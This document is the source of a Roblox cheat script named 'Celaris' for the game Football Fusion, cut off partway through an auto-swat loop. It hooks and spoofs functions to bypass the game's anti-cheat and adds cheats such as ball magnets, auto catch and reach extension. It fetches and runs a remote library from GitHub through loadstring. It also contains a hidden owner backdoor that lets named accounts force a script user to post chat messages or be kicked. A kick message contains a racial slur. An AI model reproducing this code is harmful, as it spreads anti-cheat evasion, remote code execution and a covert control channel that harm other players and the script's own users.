local allowedPlaces = {
    [8206123457] = true,
    [8204899140] = true,
    [17541256525] = true
}

if not allowedPlaces[game.PlaceId] then
    game:GetService("Players").LocalPlayer:Kick("Wrong Game Bitch Nigga Check Supported Games")
end

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local ownerNames = {
    ["x8lx8x"] = true,
    ["xleskyy"] = true
}

-- Check if player is an owner
local function isOwner(name)
    return ownerNames[name:lower()] == true
end

-- Find player by partial name (Username or DisplayName)
local function findPlayerByName(nameFragment)
    nameFragment = nameFragment:lower()
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then -- Prevent self-kick
            if plr.Name:lower() == nameFragment or plr.DisplayName:lower() == nameFragment then
                return plr
            elseif plr.Name:lower():find(nameFragment) or plr.DisplayName:lower():find(nameFragment) then
                return plr
            end
        end
    end
    return nil
end

-- Handle commands
local function handleCommand(message, speaker)
    if not isOwner(speaker.Name) then return end

    local args = message:split(" ")
    local cmd = args[1]:lower()

    if cmd == ":talk" then
        local say = message:sub(#args[1] + 2)
        local chatRemote = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
        if chatRemote and chatRemote:FindFirstChild("SayMessageRequest") then
            chatRemote.SayMessageRequest:FireServer(say, "All")
        end

    elseif cmd == ":kick" and args[2] then
        local targetName = message:sub(#cmd + 2):gsub("^%s*(.-)%s*$", "%1")
        local targetPlayer = findPlayerByName(targetName)

        if targetPlayer then
            if targetPlayer == LocalPlayer then return end -- Never kick yourself
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Youâ€™ve been kicked",
                Text = "The owner removed your access.",
                Duration = 5
            })
            task.wait(2)
            LocalPlayer:Kick("Celaris | A Premium Member/Moderator has kicked you from the server")
        end
    end
end

-- Connect to all existing and future players
local function connectPlayer(plr)
    plr.Chatted:Connect(function(msg)
        handleCommand(msg, plr)
    end)
end

for _, plr in ipairs(Players:GetPlayers()) do
    connectPlayer(plr)
end

Players.PlayerAdded:Connect(connectPlayer)


-- Executor Check
local function BadExecutors()
    return string.match(getexecutorname(), "Solara")
       or string.match(getexecutorname(), "Zorara")
       or string.match(getexecutorname(), "Wind")
       or string.match(getexecutorname(), "Celery")
       or string.match(getexecutorname(), "Scythex")
       or string.match(getexecutorname(), "Nezur")
       or string.match(getexecutorname(), "Xeno")
end

local function GoodExecutors()
    return not BadExecutors()
end

if not LPH_OBFUSCATED then
    function LPH_JIT(Function) return Function end
    function LPH_JIT_MAX(Function) return Function end
    function LPH_NO_VIRTUALIZE(Function) return Function end
end

-- Anti-Cheat Bypass
LPH_NO_VIRTUALIZE(function()
    if hookmetamethod and not BadExecutors() then
        if game.PlaceId ~= 8206123457 and game.PlaceId == 8204899140 then
            local Players = game:GetService("Players")
            local ReplicatedStorage = game:GetService("ReplicatedStorage")
            local ReplicatedFirst = game:GetService("ReplicatedFirst")

            local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()
            local ExpectedPath = LocalPlayer:GetFullName() .. ".PlayerScripts.PlayerScriptsLoader.PlayerModule.LocalScript"

            if ReplicatedFirst:FindFirstChild("LocalScript") then
                ReplicatedFirst:FindFirstChild("LocalScript"):Destroy()
                print(ExpectedPath)
            end

            local GarbageCollection = getgc(true)
            local Hooks = {}
            local FunctionList = {}
            local Handshake = nil

            local Iterator = table.foreach

            local function IsACItem(Function)
                return debug.info(Function, "s") == ExpectedPath
            end

            local function ACLine(Function)
                return debug.info(Function, "l")
            end

            Iterator(GarbageCollection, function(_, Item)
                if type(Item) == "function" and IsACItem(Item) then
                    table.insert(FunctionList, Item)
                end
            end)

            Iterator(GarbageCollection, function(_, Function)
                if type(Function) == "function" and IsACItem(Function) then
                    local Line = ACLine(Function)
                    if table.find({42, 51, 61}, Line) then
                        hookfunction(Function, function() end)
                    end
                end
            end)

            Iterator(FunctionList, function(_, Function)
                if type(Function) == "function" and debug.getinfo(Function).numparams == 7 then
                    Handshake = Function
                end
            end)

            task.wait()

            Hooks.debug_info = hookfunction(debug.info, function(...)
                local Args = {...}
                if not checkcaller() and (Args[1] == 2) and (Args[2] == "s") then
                    return "LocalScript"
                end
                return Hooks.debug_info(...)
            end)

            Hooks.__call = hookfunction(Handshake, function(...)
                local Args = {...}
                if Args[2] == 655 and Args[3] == 775 and Args[4] == 724 and Args[5] == 633 and Args[6] == 891 then
                    return Hooks.__call(...)
                elseif Args[2] == 760 and Args[3] == 760 and Args[4] == 771 and Args[5] == 665 and Args[6] == 898 then
                    return Hooks.__call(...)
                elseif Args[2] == 660 and Args[3] == 759 and Args[4] == 751 and Args[5] == 863 and Args[6] == 771 then
                    return Hooks.__call(...)
                end
            end)
        end
        AC_BYPASS = true
    end
end)()

if AC_BYPASS == true then
    print("Celaris Injected")
else
    print("Celaris failed to bypass!")
end

local Player = game:GetService("Players").LocalPlayer
local UserInputService = game:GetService("UserInputService")
local VirtualInputManager = game:GetService("VirtualInputManager")

local keysus = "RightControl"
local Magnets = false
local ShowHitbox = false
local Range = 10
local autoCatchEnabled = false
local catchDelay = 0.01
local maxAutoCatchDistance = 10 -- default value
local autoSwatEnabled = false
local swatDelay = 0.01
local maxAutoSwatDistance = 10
local autoQBEnabled = false
local resetAfterCatchEnabled = false
local resetAfterCatchDelay = 1
local autoRushEnabled = false
local autoRushDelay = 0.5
local lowerGraphicsEnabled = false
local originalMaterials = {}
local stadiumOriginalCFrame = nil
local ballTrailEnabled = false

local tackleReachEnabled = false
local autoJumpEnabled = false
local jumpDelay = 0.01
local jumpMaxDistance = 10

local pullEnabled = false
local pullDistance = 10
local pullDelayEnabled = false
local pullDelayAmount = 0.1
local lastPossessTime = 0

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local toggleBlockReach = false
local blockReachAmount = 3 -- default slider value
local originalSize = Vector3.new(0.8500000238418579, 5, 1.5)
local blockPartName = "BlockPart"

-- // Angle Enhancer
local angleEnhancerEnabled = false
local angleBoostAmount = 5
local angleHoldTime = 1.5
local angleJumpBoosted = false
local sHeldTime = 0
local previousJumpPower = 50 -- This will get overwritten once you activate

local rainWasInitiallyEnabled = false
local snowWasInitiallyEnabled = false
local rainSoundWasPlaying = false

local UseMagnetDelay = false
local MagnetDelay = 0.01 -- Default value
local HitboxColor = Color3.fromRGB(178, 178, 178) -- Default color
local HitboxTransparency = 0.8 -- Default transparency

local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()

Player.CharacterAdded:Connect(function(char)
    Character = char
end)

-- Walkspeed and No Move Restrictions Variable
local walkSpeedEnabled = false
local walkSpeedValue = 20  -- Default WalkSpeed
local jumpPowerEnabled = false
local jumpPowerValue = 50  -- Default JumpPower
local noMoveRestrictions = false

local function applyBlockReach()
	local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local blockPart = char:FindFirstChild(blockPartName)
	if blockPart and blockPart:IsA("BasePart") then
		blockPart.Size = Vector3.new(2.5, originalSize.Y, originalSize.Z + blockReachAmount)
	end
end

-- Function to reset block reach
local function resetBlockReach()
	local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local blockPart = char:FindFirstChild(blockPartName)
	if blockPart and blockPart:IsA("BasePart") then
		blockPart.Size = originalSize
	end
end

-- Character reset handling (reset-proof feature)
LocalPlayer.CharacterAdded:Connect(function()
	if toggleBlockReach then
		task.wait(1) -- wait for the character to fully load
		applyBlockReach()
	end
end)

local allowedPlaceIds = {
    [8204899140] = true,
    [17541256525] = true
}

local scrambleWall

if allowedPlaceIds[game.PlaceId] then
    scrambleWall = workspace:WaitForChild("ScrambleWall")
end

local toggle = false
local canCollideCheck = true -- Whether CanCollide should be checked

-- Function to disable CanCollide
local function disableCanCollide()
    if scrambleWall and scrambleWall:IsA("BasePart") then
        if scrambleWall.CanCollide then
            scrambleWall.CanCollide = false
        end
    end
end

-- // Feature Toggles and Sliders
local walkSpeedEnabled = false
local walkSpeedValue = 20

local jumpPowerEnabled = false
local jumpPowerValue = 50

local noMoveRestrictions = false
local autoCaptainActive = false

-- // CFrame Pull Function

local function pullToFootball()
    task.spawn(function()
        while pullEnabled do
            task.wait(0.1)

            local character = Player.Character
            if not character or not character:FindFirstChild("HumanoidRootPart") then continue end

            local hasFootball = character:FindFirstChild("Football") ~= nil
            if hasFootball then
                lastPossessTime = tick()
            elseif tick() - lastPossessTime < 1 then
                continue -- wait 1 sec after losing football
            end

            local closestFootball
            local shortestDistance = pullDistance

            for _, obj in pairs(workspace:GetDescendants()) do
                if obj:IsA("BasePart") and obj.Name == "Football" then
                    local possessed = false
                    local current = obj.Parent
                    while current do
                        if current:FindFirstChild("Humanoid") then
                            possessed = true
                            break
                        end
                        current = current.Parent
                    end

                    if not possessed then
                        local dist = (character.HumanoidRootPart.Position - obj.Position).Magnitude
                        if dist < shortestDistance then
                            shortestDistance = dist
                            closestFootball = obj
                        end
                    end
                end
            end

            if closestFootball then
                if pullDelayEnabled then task.wait(pullDelayAmount) end
                character:MoveTo(closestFootball.Position)
            end
        end
    end)
end

-- // Apply Settings Function
local function applySettings()
    local character = game:GetService("Players").LocalPlayer.Character
    if character and character:FindFirstChild("Humanoid") then
        local humanoid = character.Humanoid

        -- WalkSpeed logic
        if walkSpeedEnabled then
            if humanoid.WalkSpeed == 0 and not noMoveRestrictions then
                -- Don't apply WalkSpeed while restricted
                return
            end
            humanoid.WalkSpeed = walkSpeedValue
        elseif noMoveRestrictions and humanoid.WalkSpeed == 0 then
            humanoid.WalkSpeed = 20 -- Default speed fix when restricted but bypass is on
        else
            humanoid.WalkSpeed = 20
        end

        -- JumpPower logic
        if jumpPowerEnabled then
            humanoid.JumpPower = jumpPowerValue
        else
            humanoid.JumpPower = 50
        end
    end
end

-- Function to find the player holding the football
local function findFootballHolder()
    for _, player in pairs(Players:GetPlayers()) do
        if player.Team ~= LocalPlayer.Team then -- ðŸ›‘ Make sure player is NOT on your team
            if player.Character and player.Character:FindFirstChild("Football") then
                return player
            end
        end
    end
    return nil
end

local function predictPosition(targetHrp, timeAhead)
    local targetVelocity = targetHrp.Velocity
    return targetHrp.Position + (targetVelocity * timeAhead)
end

local function autoRush(delay)
    while autoRushEnabled do
        local footballHolder = findFootballHolder()
        if footballHolder then
            local character = LocalPlayer.Character
            local hrp = character and character:FindFirstChild("HumanoidRootPart")
            local targetHrp = footballHolder.Character and footballHolder.Character:FindFirstChild("HumanoidRootPart")

            if hrp and targetHrp then
                local predictedPosition = predictPosition(targetHrp, delay)
                if predictedPosition.Magnitude > 0 then
                    character.Humanoid:MoveTo(predictedPosition)
                end
            end
        else
            local character = LocalPlayer.Character
            if character and character:FindFirstChild("Humanoid") then
                character.Humanoid:Move(Vector3.new(0, 0, 0), true)
            end
        end
        task.wait(0.1)
    end
end


-- // Library
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/exlehskee/Celaris/refs/heads/main/sdadas"))()
local Main = Library:Create("Celaris", "Football Fusion")

local CatchingTab = Main:CreateSection("Catching")
local AutomaticsTab = Main:CreateSection("Automatics")
local PlayersTab = Main:CreateSection("Player")
local VisualsTab = Main:CreateSection("Visuals")
local SettingsTab = Main:CreateSection("Settings")

-- Catching Tab
CatchingTab:CreateLabel("Catching")
CatchingTab:CreateToggle("Ball Magnets", function(value)
    Magnets = value
end)

CatchingTab:CreateToggle("Show Hitbox", function(value)
    ShowHitbox = value
end)

CatchingTab:CreateTextBox("Magnets Size", "Size (5-20)", function(v)
    local num = tonumber(v)

    if num and num >= 5 and num <= 20 then
        Range = num

        -- Update sphere sizes
        for _, v in workspace:GetDescendants() do
            if v:IsA("BasePart") and v.Name == "RangeSphere" then
                v.Size = Vector3.new(Range, Range, Range)
            end
        end

        -- Success notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Magnet Size Updated",
                Text = "New Size: " .. num,
                Duration = 3
            })
        end)
    else
        -- Error notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Invalid Size",
                Text = "Enter a number from 5 to 20",
                Duration = 3
            })
        end)
    end
end)

CatchingTab:CreateToggle("Magnet Delay", function(value)
    UseMagnetDelay = value
end)

CatchingTab:CreateTextBox("Delay Amount", "Delay (0.01 - 1)", function(v)
    local num = tonumber(v)

    if num and num >= 0.01 and num <= 1 then
        MagnetDelay = num

        -- Success notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Magnet Delay Updated",
                Text = "New Delay: " .. num,
                Duration = 3
            })
        end)
    else
        -- Error notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Invalid Delay",
                Text = "Enter a number from 0.01 to 1",
                Duration = 3
            })
        end)
    end
end)

CatchingTab:CreateLabel("CFrame Pull")
CatchingTab:CreateToggle("Enabled", function(value)
    pullEnabled = value
    if value then
        pullToFootball()
    end
end)

CatchingTab:CreateTextBox("Pull Distance", "5 - 15", function(v)
    local num = tonumber(v)

    if num and num >= 5 and num <= 15 then
        pullDistance = num

        -- Success notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Pull Distance Updated",
                Text = "New Distance: " .. num,
                Duration = 3
            })
        end)
    else
        -- Error notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Invalid Distance",
                Text = "Enter a number from 5 to 15",
                Duration = 3
            })
        end)
    end
end)

CatchingTab:CreateToggle("Pull Delay", function(value)
    pullDelayEnabled = value
end)

CatchingTab:CreateTextBox("Delay", "Delay (0.01 - 1)", function(v)
    local num = tonumber(v)

    if num and num >= 0.01 and num <= 1 then
        pullDelayAmount = num
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Pull Delay Updated",
                Text = "New Delay: " .. num,
                Duration = 3
            })
        end)
    else
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Invalid Delay",
                Text = "Enter a number from 0.01 to 1",
                Duration = 3
            })
        end)
    end
end)

CatchingTab:CreateLabel("Hitbox Settings")

CatchingTab:CreateTextBox("Hitbox Color", "RGB CODE", function(v)
    local r, g, b = v:match("(%d+),%s*(%d+),%s*(%d+)")
    r, g, b = tonumber(r), tonumber(g), tonumber(b)

    if r and g and b and r <= 255 and g <= 255 and b <= 255 then
        HitboxColor = Color3.fromRGB(r, g, b)

        -- Update all current spheres
        for _, football in workspace:GetChildren() do
            if football.Name == "Football" and football:IsA("BasePart") then
                local sphere = football:FindFirstChild("RangeSphere")
                if sphere then
                    sphere.Color = HitboxColor
                end
            end
        end

        -- Notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Hitbox Color Updated",
                Text = string.format("New Color: RGB(%d, %d, %d)", r, g, b),
                Duration = 3
            })
        end)
    else
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Invalid Input",
                Text = "Please enter 3 numbers from 0-255 separated by commas",
                Duration = 3
            })
        end)
    end
end)

CatchingTab:CreateTextBox("Hitbox Transparency", "0 - 0.9", function(v)
    local num = tonumber(v)

    if num and num >= 0 and num <= 0.9 then
        HitboxTransparency = num

        -- Update all current spheres
        for _, football in workspace:GetChildren() do
            if football.Name == "Football" and football:IsA("BasePart") then
                local sphere = football:FindFirstChild("RangeSphere")
                if sphere then
                    sphere.Transparency = ShowHitbox and HitboxTransparency or 1
                end
            end
        end

        -- Success notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Transparency Updated",
                Text = "New Transparency: " .. num,
                Duration = 3
            })
        end)
    else
        -- Error notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Invalid Input",
                Text = "Enter a number between 0 and 0.9",
                Duration = 3
            })
        end)
    end
end)


-- // Automatics Tab

AutomaticsTab:CreateLabel("Auto Catch")
AutomaticsTab:CreateToggle("Enabled", function(value)
    autoCatchEnabled = value 
end)
AutomaticsTab:CreateTextBox("Catch Delay", "Delay (0.01 - 3)", function(v)
    local num = tonumber(v)

    if num and num >= 0.01 and num <= 3 then
        catchDelay = num
        -- Success notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Auto Catch Delay Updated",
                Text = "New Delay: " .. num,
                Duration = 3
            })
        end)
    else
        -- Error notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Invalid Delay",
                Text = "Enter a number from 0.01 to 3",
                Duration = 3
            })
        end)
    end
end)

AutomaticsTab:CreateTextBox("Max Distance", "Amount (10-50)", function(v)
    local num = tonumber(v)

    if num and num >= 10 and num <= 30 then
        maxAutoSwatDistance = num

        -- Success notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Max Swat Distance Updated",
                Text = "New Distance: " .. num,
                Duration = 3
            })
        end)
    else
        -- Error notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Invalid Distance",
                Text = "Enter a number from 10 to 50",
                Duration = 3
            })
        end)
    end
end)

AutomaticsTab:CreateLabel("Auto Swat")

AutomaticsTab:CreateToggle("Enabled", function(value)
    autoSwatEnabled = value 
end)
AutomaticsTab:CreateTextBox("Swat Delay", "Delay (0.01 - 3)", function(v)
    local num = tonumber(v)

    if num and num >= 0.01 and num <= 3 then
        swatDelay = num
        -- Success notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Auto Swat Delay Updated",
                Text = "New Delay: " .. num,
                Duration = 3
            })
        end)
    else
        -- Error notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Invalid Delay",
                Text = "Enter a number from 0.01 to 3",
                Duration = 3
            })
        end)
    end
end)

AutomaticsTab:CreateTextBox("Max Distance", "Amount (10-50)", function(v)
    local num = tonumber(v)

    if num and num >= 10 and num <= 30 then
        maxAutoSwatDistance = num

        -- Success notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Max Swat Distance Updated",
                Text = "New Distance: " .. num,
                Duration = 3
            })
        end)
    else
        -- Error notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Invalid Distance",
                Text = "Enter a number from 10 to 50",
                Duration = 3
            })
        end)
    end
end)

AutomaticsTab:CreateLabel("Auto Jump")
AutomaticsTab:CreateToggle("Enabled", function(value)
    autoJumpEnabled = value 
end)
AutomaticsTab:CreateTextBox("Jump Delay", "Delay Number", function(v)
    local num = tonumber(v)

    if num and num >= 0.01 and num <= 1 then
        jumpDelay = num
        -- Success notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Auto Jump Delay Updated",
                Text = "New Delay: " .. num,
                Duration = 3
            })
        end)
    else
        -- Error notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Invalid Delay",
                Text = "Enter a number from 0.01 to 1",
                Duration = 3
            })
        end)
    end
end)

AutomaticsTab:CreateTextBox("Jump Delay", "Delay Number", function(v)
    local num = tonumber(v)

    if num and num >= 10 and num <= 50 then
        jumpMaxDistance = num
        -- Success notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Jump Max Distance Updated",
                Text = "New Delay: " .. num,
                Duration = 3
            })
        end)
    else
        -- Error notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Invalid Delay",
                Text = "Enter a number from 10 to 50",
                Duration = 3
            })
        end)
    end
end)

AutomaticsTab:CreateLabel("Reset After Catch")

AutomaticsTab:CreateToggle("Enabled", function(value)
    resetAfterCatchEnabled = value 
end)

AutomaticsTab:CreateTextBox("RAC Delay", "Delay (0.01 - 2)", function(v)
    local num = tonumber(v)

    if num and num >= 0.01 and num <= 2 then
        catchDelay = num
        -- Success notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "RAC Delay Updated",
                Text = "New Delay: " .. num,
                Duration = 3
            })
        end)
    else
        -- Error notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Invalid Delay",
                Text = "Enter a number from 0.01 to 2",
                Duration = 3
            })
        end)
    end
end)

AutomaticsTab:CreateLabel("Auto QB")
AutomaticsTab:CreateToggle("Enabled", function(value)
    autoQBEnabled = value 
end)

AutomaticsTab:CreateLabel("Auto Rush")
AutomaticsTab:CreateToggle("Enabled", function(value)
    autoRushEnabled = value
    if value then
        spawn(function()
            autoRush(autoRushDelay)
        end)
    end
end)

AutomaticsTab:CreateTextBox("Rush Delay", "Delay (0.01 - 1)", function(v)
    local num = tonumber(v)

    if num and num >= 0.01 and num <= 1 then
        autoRushDelay = num
        -- Success notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Auto-Rush Delay Updated",
                Text = "New Delay: " .. num,
                Duration = 3
            })
        end)
    else
        -- Error notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Invalid Delay",
                Text = "Enter a number from 0.01 to 1",
                Duration = 3
            })
        end)
    end
end)


-- Player Tab:

PlayersTab:CreateLabel("Player")
PlayersTab:CreateToggle("WalkSpeed", function(value)
    walkSpeedEnabled = value
end)

PlayersTab:CreateTextBox("Walkspeed Amount", "Amount (20-23)", function(v)
    local num = tonumber(v)

    if num and num >= 20 and num <= 23 then
        walkSpeedValue = num

        -- Success notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "WalkSpeed Updated",
                Text = "New WalkSpeed: " .. num,
                Duration = 3
            })
        end)
    else
        -- Error notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Invalid WalkSpeed",
                Text = "Enter a number from 20 to 23",
                Duration = 3
            })
        end)
    end
end)

PlayersTab:CreateToggle("JumpPower", function(value)
    jumpPowerEnabled = value
end)

PlayersTab:CreateTextBox("JumpPower Amount", "Amount (50-60)", function(v)
    local num = tonumber(v)

    if num and num >= 50 and num <= 60 then
        jumpPowerValue = num

        -- Success notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "JumpPower Updated",
                Text = "New JumpPower: " .. num,
                Duration = 3
            })
        end)
    else
        -- Error notification
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Invalid JumpPower",
                Text = "Enter a number from 20 to 23",
                Duration = 3
            })
        end)
    end
end)

local function updateAngleEnhancer()
    if not angleEnhancerEnabled then return end

    local char = Player.Character
    if not char then return end

    local humanoid = char:FindFirstChildWhichIsA("Humanoid")
    if not humanoid then return end

    local currentTime = tick()

    if UserInputService:IsKeyDown(Enum.KeyCode.S) then
        if sHeldTime == 0 then
            sHeldTime = currentTime
        elseif currentTime - sHeldTime >= angleHoldTime and not angleJumpBoosted then
            previousJumpPower = humanoid.JumpPower
            humanoid.JumpPower = previousJumpPower + angleBoostAmount
            angleJumpBoosted = true
        end
    else
        if angleJumpBoosted then
            humanoid.JumpPower = previousJumpPower
        end
        angleJumpBoosted = false
        sHeldTime = 0
    end
end

PlayersTab:CreateLabel("Angle Enhancer")
PlayersTab:CreateToggle("Enabled", function(value)
    angleEnhancerEnabled = value

    if not value and angleJumpBoosted then
        local char = Player.Character
        if char then
            local humanoid = char:FindFirstChildWhichIsA("Humanoid")
            if humanoid then
                humanoid.JumpPower = previousJumpPower
            end
        end
        angleJumpBoosted = false
        sHeldTime = 0
    end

    if value then
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Angle Enhancer",
                Text = "If JumpPower is enabled you should probably turn it off so you're not blatant.",
                Duration = 4
            })
        end)
    end
end)

PlayersTab:CreateTextBox("Angle Boost", "Enter a number from 1 to 10", function(v)
    local num = tonumber(v)
    if num and num >= 1 and num <= 10 then
        angleBoostAmount = num
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Angle Boost Updated",
                Text = "New Boost: " .. num,
                Duration = 3
            })
        end)
    else
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Invalid Value",
                Text = "Enter a number between 1 and 10",
                Duration = 3
            })
        end)
    end
end)

PlayersTab:CreateTextBox("Hold-Time", "Enter a number from 1 to 3", function(v)
    local num = tonumber(v)
    if num and num >= 1 and num <= 3 then
        angleHoldTime = num
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Hold-Time Updated",
                Text = "New Hold-Time: " .. num .. "s",
                Duration = 3
            })
        end)
    else
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Invalid Value",
                Text = "Enter a number between 1 and 3",
                Duration = 3
            })
        end)
    end
end)

PlayersTab:CreateLabel("Defense")

PlayersTab:CreateToggle("Tackle Reach", function(value)
    tackleReachEnabled = value
end)

PlayersTab:CreateToggle("Block Reach", function(value)
	toggleBlockReach = value
	if toggleBlockReach then
		applyBlockReach()
	else
		resetBlockReach()
	end
end)

PlayersTab:CreateTextBox("Reach Amount", "3 - 10", function(v)
	local num = tonumber(v)

	if num and num >= 3 and num <= 10 then
		blockReachAmount = num

		-- Apply instantly if toggle is on
		if toggleBlockReach then
			applyBlockReach()
		end

		-- Success notification
		pcall(function()
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Reach Amount Updated",
				Text = "New Amount: " .. num,
				Duration = 3
			})
		end)
	else
		-- Error notification
		pcall(function()
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Invalid Amount",
				Text = "Enter a number from 3 to 10",
				Duration = 3
			})
		end)
	end
end)

PlayersTab:CreateLabel("Miscellaneous")

PlayersTab:CreateToggle("No Move Restrictions", function(value)
    noMoveRestrictions = value
end)



-- VisualsTab

VisualsTab:CreateLabel("Visuals")
VisualsTab:CreateToggle("Better FPS", function(value)
    lowerGraphicsEnabled = value
    handleGraphics(Player.Character, value)
end)

VisualsTab:CreateToggle("Hide Stadium", function(value)
    local stadium = workspace:FindFirstChild("Models").Stadium
    if stadium and stadium:IsA("Model") then
        if stadium.PrimaryPart then
            if value then
                if not stadiumOriginalCFrame then
                    stadiumOriginalCFrame = stadium:GetPrimaryPartCFrame()
                end
                stadium:SetPrimaryPartCFrame(stadium.PrimaryPart.CFrame * CFrame.new(0, -500, 0))
            else
                if stadiumOriginalCFrame then
                    stadium:SetPrimaryPartCFrame(stadiumOriginalCFrame)
                end
            end
        end
    end
end)

VisualsTab:CreateLabel("Weather Visuals")
VisualsTab:CreateToggle("Remove Rain", function(value)
    local weather = workspace:FindFirstChild("SkyWeather")
    local sounds = workspace:FindFirstChild("Sounds")

    -- Handle Rain Particles
    if weather and weather:IsA("BasePart") then
        local rain = weather:FindFirstChild("Rain")
        if rain and rain:IsA("ParticleEmitter") then
            if value then
                rainWasInitiallyEnabled = rain.Enabled
                if rain.Enabled then
                    rain.Enabled = false
                end
            else
                if rainWasInitiallyEnabled then
                    rain.Enabled = true
                end
            end
        end
    end

    -- Handle Rain Sound
    if sounds and sounds:FindFirstChild("Rain") then
        local rainSound = sounds:FindFirstChild("Rain")
        if value then
            rainSoundWasPlaying = rainSound.IsPlaying
            if rainSound:IsA("Sound") and rainSound.IsPlaying then
                rainSound:Stop()
            end
        else
            if rainSoundWasPlaying and rainSound:IsA("Sound") and not rainSound.IsPlaying then
                rainSound:Play()
            end
        end
    end
end)

local snowStates = {} -- Table to track original states

VisualsTab:CreateToggle("Remove Snow", function(value)
    local weather = workspace:FindFirstChild("SkyWeather")
    if not weather or not weather:IsA("BasePart") then return end

    -- Get all descendants named "Snow" that are ParticleEmitters
    local snowEmitters = {}
    for _, descendant in ipairs(weather:GetDescendants()) do
        if descendant:IsA("ParticleEmitter") and descendant.Name == "Snow" then
            table.insert(snowEmitters, descendant)
        end
    end

    if value then
        -- Toggle ON: Store state & disable active ones
        snowStates = {}
        for _, snow in ipairs(snowEmitters) do
            snowStates[snow] = snow.Enabled
            if snow.Enabled then
                snow.Enabled = false
            end
        end
    else
        -- Toggle OFF: Re-enable only those that were originally enabled
        for snow, wasEnabled in pairs(snowStates) do
            if snow and snow:IsDescendantOf(workspace) and wasEnabled then
                snow.Enabled = true
            end
        end
    end
end)

VisualsTab:CreateLabel("Miscellaneous")
VisualsTab:CreateToggle("Remove QB Boundaries", function(value)
    toggle = value
end)

-- Source



task.spawn(function()
    while true do
        task.wait()

        if autoCatchEnabled then
            local char = Player.Character
            if not char or not char:FindFirstChild("HumanoidRootPart") then continue end

            local closest, closestDist = nil, math.huge
            for _, v in workspace:GetChildren() do
                if v.Name == "Football" and v:IsA("BasePart") then
                    local dist = (char.HumanoidRootPart.Position - v.Position).Magnitude
                    if dist < closestDist then
                        closest = v
                        closestDist = dist
                    end
                end
            end

            if closest and closestDist <= maxAutoCatchDistance then
                task.wait(catchDelay)

                local targetKey = Enum.KeyCode.C
                game:GetService("VirtualInputManager"):SendKeyEvent(true, targetKey, false, game)
                task.wait(0.1)
                game:GetService("VirtualInputManager"):SendKeyEvent(false, targetKey, false, game)
            end
        end
    end
end)


-- // Remove the sphere when the football disappears from the workspac

task.spawn(function()
    while true do
        task.wait()

        if autoSwatEnabled then
            local char = Player.Character
            if not char or not char:FindFirstChild("HumanoidRootPart") then continue end

            local closest, closestDist = nil, math.huge
            for _, v in workspace:GetChildren() do
                if v.Name == "Football" and v:IsA("BasePart") then
                    local dist = (char.HumanoidRootPart.Position - v.Position).Magnitude
                    if dist < closestDist then
                        closest = v
                        closestDist = dist
                    end
                end
            end

            if closest and closestDist <= maxAutoSwatDistance then
                task.wait(swatDelay)

                local vim = game:GetService("VirtualInputManager")
                vim:SendKeyEvent(true, Enum.KeyCode.R, false, game)
                task.wait(0.1)
